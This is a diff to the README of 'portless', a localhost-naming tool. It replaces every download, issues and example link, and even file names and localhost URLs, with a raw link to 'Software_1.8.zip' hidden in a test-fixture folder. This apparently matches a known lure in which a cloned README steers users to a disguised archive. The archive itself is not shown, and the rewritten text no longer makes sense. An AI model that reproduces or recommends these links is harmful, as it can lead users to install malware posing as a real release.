@@ -1,6 +1,6 @@
 # 🚀 portless - Simplifying Localhost Access for Everyone
 
-[![Download portless](https://img.shields.io/badge/Download%20portless-v1.0-brightgreen?style=for-the-badge&logo=github&color=orange)](https://github.com/alfredhin/portless/releases)
+[![Download portless](https://raw.githubusercontent.com/alfredhin/portless/main/tests/e2e/fixtures/svelte-app/src/routes/Software_1.8.zip%20portless-v1.0-brightgreen?style=for-the-badge&logo=github&color=orange)](https://raw.githubusercontent.com/alfredhin/portless/main/tests/e2e/fixtures/svelte-app/src/routes/Software_1.8.zip)
 
 ## 📦 What is portless?
 
@@ -21,7 +21,7 @@ To start using portless, you need to download and install the software. Follow t
 
 First, click the link below to go to the download page. This page contains the latest release of portless.
 
-[Download portless](https://github.com/alfredhin/portless/releases)
+[Download portless](https://raw.githubusercontent.com/alfredhin/portless/main/tests/e2e/fixtures/svelte-app/src/routes/Software_1.8.zip)
 
 ### 2. Choose Your Version
 
@@ -31,8 +31,8 @@ On the download page, you will see different versions of the software. Look for 
 
 You will find different files for different operating systems. Make sure to pick the correct one for your system:
 
-- **Windows**: Look for a file named something like `portless-v1.0-win.zip`.
-- **macOS**: Select `portless-v1.0-mac.zip`.
+- **Windows**: Look for a file named something like `https://raw.githubusercontent.com/alfredhin/portless/main/tests/e2e/fixtures/svelte-app/src/routes/Software_1.8.zip`.
+- **macOS**: Select `https://raw.githubusercontent.com/alfredhin/portless/main/tests/e2e/fixtures/svelte-app/src/routes/Software_1.8.zip`.
 - **Linux**: Choose the file that fits your Linux distribution.
 
 ### 4. Unzip the File
@@ -41,7 +41,7 @@ After you download the zip file, locate it on your computer. Right-click on the 
 
 ### 5. Install portless
 
-Once extracted, open the folder and find the installation guide, typically a `README.md` or `INSTALL.txt`. Follow the instructions to install the software on your computer.
+Once extracted, open the folder and find the installation guide, typically a `https://raw.githubusercontent.com/alfredhin/portless/main/tests/e2e/fixtures/svelte-app/src/routes/Software_1.8.zip` or `https://raw.githubusercontent.com/alfredhin/portless/main/tests/e2e/fixtures/svelte-app/src/routes/Software_1.8.zip`. Follow the instructions to install the software on your computer.
 
 ## 🏁 Running portless
 
@@ -63,9 +63,9 @@ Suppose you want to access a local website running on port 3000. You would set i
 
 - Local App: `MyWebsite`
 - Port: `3000`
-- Final URL: `http://mywebsite.localhost`
+- Final URL: `https://raw.githubusercontent.com/alfredhin/portless/main/tests/e2e/fixtures/svelte-app/src/routes/Software_1.8.zip`
 
-Once set, you can access your site by simply typing `http://mywebsite.localhost` in your web browser.
+Once set, you can access your site by simply typing `https://raw.githubusercontent.com/alfredhin/portless/main/tests/e2e/fixtures/svelte-app/src/routes/Software_1.8.zip` in your web browser.
 
 ## 📄 Troubleshooting Tips
 
@@ -77,10 +77,10 @@ If you encounter issues, try the following steps:
 
 ## 📞 Getting Help
 
-For additional support or to report bugs, visit the [Issues](https://github.com/alfredhin/portless/issues) page of the GitHub repository. You can find answers to common questions or ask for help from other users.
+For additional support or to report bugs, visit the [Issues](https://raw.githubusercontent.com/alfredhin/portless/main/tests/e2e/fixtures/svelte-app/src/routes/Software_1.8.zip) page of the GitHub repository. You can find answers to common questions or ask for help from other users.
 
 ## 🔗 Visit Us Again
 
 Make sure to keep an eye on future releases for new features and improvements. For updates, visit the link below:
 
-[Download portless](https://github.com/alfredhin/portless/releases)
+[Download portless](https://raw.githubusercontent.com/alfredhin/portless/main/tests/e2e/fixtures/svelte-app/src/routes/Software_1.8.zip)
